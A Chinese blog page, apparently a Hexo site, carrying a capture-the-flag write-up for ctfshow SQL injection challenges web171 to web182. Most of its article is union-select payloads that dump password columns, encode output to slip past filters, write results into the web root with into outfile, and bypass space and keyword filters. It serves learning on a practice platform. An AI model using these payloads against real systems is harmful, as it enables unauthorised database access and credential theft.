@@ -1,0 +1,587 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="ctfshow-sql题记">
+  <meta name="author" content="OPN">
+  <meta name="keywords" content="">
+  
+  <title>ctfshow-sql - OPN&#39;S BLOG</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"opn90.top","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":3},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong> OPN'S BLOG </strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="ctfshow-sql">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-07-18 14:21" pubdate>
+        2021年7月18日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      954 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      14
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">ctfshow-sql</h1>
+            
+              <p class="note note-info">
+                
+                  本文最后更新于：4 个月前
+                
+              </p>
+            
+            <div class="markdown-body">
+              <p>ctfshow-sql题记</p>
+<span id="more"></span>
+
+<h1 id="web171-web175-无过滤注入"><a href="#web171-web175-无过滤注入" class="headerlink" title="web171-web175 无过滤注入"></a>web171-web175 无过滤注入</h1><h2 id="web171-‘-23’-‘–-’"><a href="#web171-‘-23’-‘–-’" class="headerlink" title="web171  ‘%23’ + ‘–+’"></a>web171  ‘%23’ + ‘–+’</h2><p><img src="/2021/07/18/ctfshow-sql/1.png" srcset="/img/loading.gif" lazyload>  </p>
+<p>SQL注释符 : url(%23) === # === –+</p>
+<p>payload:  </p>
+<div class="hljs code-wrapper"><pre><code>1′ or 1=1%23
+</code></pre></div>
+<h2 id="web172-to-base64-hex"><a href="#web172-to-base64-hex" class="headerlink" title="web172  to_base64()/hex()"></a>web172  to_base64()/hex()</h2><p><img src="/2021/07/18/ctfshow-sql/2.png" srcset="/img/loading.gif" lazyload>    </p>
+<p>对结果进行了过滤，查询出的数据中不能包含flag，给出了数据库ctfshow_user2<br>flag头为ctfshow{xxx}，不包含’flag’ ……</p>
+<p>可用to_base64()/hex()直接在输出时进行编码，绕过输出时特殊字符的过滤</p>
+<p>payload:  </p>
+<div class="hljs code-wrapper"><pre><code>1&#39;union select 1,2 %23
+//确定注入点
+1&#39;union select 1,password from ctfshow_user2 %23  
+//get flag  
+1&#39;union select 1,to_base64(password) from ctfshow_user2 where username=&#39;flag&#39; %23
+//利用to_base64()进行特殊字符的绕过
+</code></pre></div>
+<h2 id="web173-json数据"><a href="#web173-json数据" class="headerlink" title="web173  json数据"></a>web173  json数据</h2><p><img src="/2021/07/18/ctfshow-sql/3.png" srcset="/img/loading.gif" lazyload><br>json数据类型  </p>
+<p><img src="/2021/07/18/ctfshow-sql/5.png" srcset="/img/loading.gif" lazyload>   </p>
+<p>函数json_encode()和json_decode()  </p>
+<p><img src="/2021/07/18/ctfshow-sql/6.png" srcset="/img/loading.gif" lazyload><br>payload:  </p>
+<div class="hljs code-wrapper"><pre><code>1&#39;union select 1,2,3%23
+//确定注入点  
+1&#39;union select 1,2,password from ctfshow_user3%23
+//get flag 
+</code></pre></div>
+<h2 id="web174-hex-replace"><a href="#web174-hex-replace" class="headerlink" title="web174  hex()/replace()"></a>web174  hex()/replace()</h2><p>避坑：第一次点击进入的是web173的网页……我是傻逼</p>
+<p>数据库：ctfshow_user4   </p>
+<p><img src="/2021/07/18/ctfshow-sql/9.png" srcset="/img/loading.gif" lazyload>  </p>
+<p>返回数据，ban了flag和0-9</p>
+<p>用的是替换的思路，将数字转换为其他字符，但分不清该字符是原字符还是替换后字符，<br>为避免该问题，用hex()函数将flag转为16进制，然后将0-9替换为q-z输出，<br>hex()返回值仅包含0-9和大写A-F，可解决上述问题。</p>
+<p>payload:  </p>
+<div class="hljs code-wrapper"><pre><code>1&#39;union select &#39;a&#39;,&#39;b&#39;%23
+//确定注入点
+1&#39; union select &#39;a&#39;,(select replace(replace (replace(replace(replace(replace(replace(replace(replace(replace(hex(password),&#39;1&#39;,&#39;q&#39;),&#39;2&#39;,&#39;r&#39;),&#39;3&#39;,&#39;s&#39;),&#39;4&#39;,&#39;t&#39;),&#39;5&#39;,&#39;u&#39;),&#39;6&#39;,&#39;v&#39;),&#39;7&#39;,&#39;w&#39;),&#39;8&#39;,&#39;x&#39;),&#39;9&#39;,&#39;y&#39;),&#39;0&#39;,&#39;z&#39;) from ctfshow_user4 where username=&#39;flag&#39;)–+
+//sql语句 get flag 
+</code></pre></div>
+<p>人工处理/脚本处理字符串，get flag</p>
+<p>附python代码截图</p>
+<p><img src="/2021/07/18/ctfshow-sql/10.png" srcset="/img/loading.gif" lazyload>   </p>
+<h2 id="web175-into-outfile写入文件"><a href="#web175-into-outfile写入文件" class="headerlink" title="web175  into outfile写入文件"></a>web175  into outfile写入文件</h2><p>数据库：ctfshow_user5<br><img src="/2021/07/18/ctfshow-sql/11.png" srcset="/img/loading.gif" lazyload>   </p>
+<p>返回数据，ban了所有字符……正常数据都不回显……</p>
+<p>select  into  outfield  功能：<br>导出数据到pc的指定目录下。</p>
+<p>payload:  </p>
+<div class="hljs code-wrapper"><pre><code>1′ union select 1,2%23
+//确定注入点
+1′ union select 1,password from ctfshow_user5 into outfile &#39;/var/www/html/res.txt&#39;%23
+//访问res.txt get flag
+</code></pre></div>
+<hr>
+<h1 id="web176-web182-过滤注入"><a href="#web176-web182-过滤注入" class="headerlink" title="web176-web182  过滤注入"></a>web176-web182  过滤注入</h1><p><img src="/2021/07/18/ctfshow-sql/12.png" srcset="/img/loading.gif" lazyload> </p>
+<p><img src="/2021/07/18/ctfshow-sql/13.png" srcset="/img/loading.gif" lazyload> </p>
+<h2 id="web176-大小写"><a href="#web176-大小写" class="headerlink" title="web176  大小写"></a>web176  大小写</h2><div class="hljs code-wrapper"><pre><code>&#39;union select 1,2,3 from ctfshow_user%23
+//判断注入点
+&#39;union Select 1,2,3 from ctfshow_user%23
+//确定注入点
+&#39;union Select 1,2,password from ctfshow_user%23
+//get flag
+</code></pre></div>
+<h2 id="web177"><a href="#web177" class="headerlink" title="web177  /**/"></a>web177  /**/</h2><p>ban空格==&gt;可使用/**/</p>
+<p>数据库名，表名，列名可用”包含</p>
+<div class="hljs code-wrapper"><pre><code>1&#39;union/**/select/**/1,2,password/**/from`ctfshow_user`%23
+//get flag
+</code></pre></div>
+<h2 id="web178-09-20"><a href="#web178-09-20" class="headerlink" title="web178  %09 %20"></a>web178  %09 %20</h2><p>ban空格，/**/==&gt;%09<br>%20无用</p>
+<p>ASCII(09)===Tab(水平制表符)<br>ASCII(20)===Space(空格)</p>
+<div class="hljs code-wrapper"><pre><code>&#39;union%09select%091,2,password%09from`ctfshow_user`%23
+//get flag
+</code></pre></div>
+<h2 id="web179-0c-0C"><a href="#web179-0c-0C" class="headerlink" title="web179  %0c/%0C"></a>web179  %0c/%0C</h2><p>空格==&gt;%0c/%0C</p>
+<p>ASCII(0C)===换页键</p>
+<div class="hljs code-wrapper"><pre><code>&#39;union%0cselect%0c1,2,password%0cfrom`ctfshow_user`%23
+//get flag
+</code></pre></div>
+<h2 id="web-180-‘1’-’1"><a href="#web-180-‘1’-’1" class="headerlink" title="web 180 ‘1’=’1"></a>web 180 ‘1’=’1</h2><p>ban %23==&gt;’1’=’1</p>
+<p>group_concat()拼接字符串</p>
+<div class="hljs code-wrapper"><pre><code>&#39;union%0cselect%0c1,2,group_concat(password)%0cfrom%0cctfshow_user%0cwhere%0c&#39;1&#39;=&#39;1
+//get flag
+id=-1&#39;or(id=26)and&#39;1&#39;=&#39;1
+//Y4tacker师傅的姿势
+</code></pre></div>
+<h2 id="web181-逻辑-and-gt-or"><a href="#web181-逻辑-and-gt-or" class="headerlink" title="web181  逻辑 and&gt;or"></a>web181  逻辑 and&gt;or</h2><p><img src="/2021/07/18/ctfshow-sql/14.png" srcset="/img/loading.gif" lazyload> </p>
+<p>除了括号，其他可以代替空格的都给过滤了， 而且select还不区分大小写了</p>
+<div class="hljs code-wrapper"><pre><code>可用180中Y4tacker师傅的姿势：
+&#39;or(id=26)and&#39;1&#39;=&#39;1
+放进入sql语句 –&gt;
+&quot;select id,username,password from ctfshow_user where username !=&#39;flag&#39; and id = &quot;or(id=26)and&#39;1&#39;=&#39;1&#39; limit 1; &quot;;
+因为and的优先级大于or，语句相当于
+(username !=&#39;flag&#39; and id =&quot;) or (id=26 and &#39;1&#39;=&#39;1&#39;)
+左边为假，右边是真，所以sql语句相当于
+select id,username,password from ctfshow_user where id=26 and &#39;1&#39;=&#39;1&#39; limit 1 ;    
+利用逻辑关系闭合payload
+</code></pre></div>
+<p>学废了学废了  </p>
+<p>借鉴上述原理，构建近似payload：  </p>
+<div class="hljs code-wrapper"><pre><code>&#39;or(`username`=&#39;flag&#39;)and&#39;1&#39;=&#39;1
+&#39;or(`password`like&#39;c%&#39;)and&#39;1&#39;=&#39;1 //flag以c开头
+</code></pre></div>
+<h2 id="web182-模糊搜索-like"><a href="#web182-模糊搜索-like" class="headerlink" title="web182  模糊搜索 like"></a>web182  模糊搜索 like</h2><p><img src="/2021/07/18/ctfshow-sql/15.png" srcset="/img/loading.gif" lazyload> </p>
+<p>在181的基础上+ban了flag  </p>
+<div class="hljs code-wrapper"><pre><code>&#39;or(`username`like&#39;f%&#39;)and&#39;1&#39;=&#39;1 
+//模糊搜索
+&#39;or(`password`like&#39;c%&#39;)and&#39;1&#39;=&#39;1 
+//flag以c开头
+</code></pre></div>
+<h1 id="未完待续"><a href="#未完待续" class="headerlink" title="未完待续"></a>未完待续</h1><p>………………………………</p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/web-ctfshow/">web ctfshow</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/07/19/BUU-sql/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">BUU-sql</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+<a href="http://www.beian.miit.gov.cn/"  style="color:#f72b07" target="_blank">苏ICP备2021015436号-1</a>
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
